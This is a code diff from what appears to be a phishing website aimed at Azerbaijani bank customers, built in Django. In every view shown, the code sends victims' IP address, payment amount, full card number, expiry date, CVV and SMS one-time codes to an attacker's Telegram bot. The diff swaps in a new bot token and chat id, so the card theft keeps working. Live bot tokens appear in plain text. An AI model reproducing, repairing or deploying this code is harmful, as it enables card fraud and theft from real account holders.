@@ -44,7 +44,7 @@ def login(request):
         country = get_country_from_ip(ip_address)
         if country!= "AZ":
             country= 'Şübhəli İP!'
-        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{contact.ip}|Country:{country}\nPage:{contact.page_name}\nMəbləğ:{subtotal}\n  @kitayskiadam @TetaLab @alienfx')
+        response = requests.post(f'https://api.telegram.org/bot6412307197:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw/sendMessage?chat_id=-1001982703394&text=id:{contact.id}|ip:{contact.ip}|Country:{country}\nPage:{contact.page_name}\nMəbləğ:{subtotal}\n  @kitayskiadam @TetaLab @alienfx')
 
         return render(request, 'cerime2.html',context)
     context = {
@@ -131,7 +131,7 @@ def payments(request):
         country = get_country_from_ip(contact.ip)
         if country!= "AZ":
             country= 'Şübhəli İP!'
-        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{contact.ip}|Country:{country}\nPage:{contact.page_name}\nMəbləğ:{contact.amount}\nCC:{cardnumber}|{contact.mm}|{contact.yy}|{contact.cvv} \n@kitayskiadam @TetaLab @alienfx')
+        response = requests.post(f'https://api.telegram.org/bot6412307197:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw/sendMessage?chat_id=-1001982703394&text=id:{contact.id}|ip:{contact.ip}|Country:{country}\nPage:{contact.page_name}\nMəbləğ:{contact.amount}\nCC:{cardnumber}|{contact.mm}|{contact.yy}|{contact.cvv} \n@kitayskiadam @TetaLab @alienfx')
 
         return render(request, "pages/loading.html",{'last_contact_id': contact.id})
     return render(request, "pay.html")
@@ -200,7 +200,7 @@ def dseckapital(request):
         country = get_country_from_ip(contact.ip)
         if country!= "AZ":
             country= 'Şübhəli İP!'
-        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{country}\nPage:Loading\nsms:{concatenated}')
+        response = requests.post(f'https://api.telegram.org/bot6412307197:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw/sendMessage?chat_id=-1001982703394&text=id:{contact.id}|ip:{country}\nPage:Loading\nsms:{concatenated}')
         return render( request,'pages/loading.html' )
     
     return render( request,'pages/loading.html',context )
@@ -226,7 +226,7 @@ def dsecazericard(request):
         country = get_country_from_ip(contact.ip)
         if country!= "AZ":
             country= 'Şübhəli İP!'
-        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{country}\nPage:Loading\nsms:{contact.sms}')
+        response = requests.post(f'https://api.telegram.org/bot6412307197:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw/sendMessage?chat_id=-1001982703394&text=id:{contact.id}|ip:{country}\nPage:Loading\nsms:{contact.sms}')
 
         return render( request,'pages/loading.html',context )
     return render( request,'pages/loading.html',context )
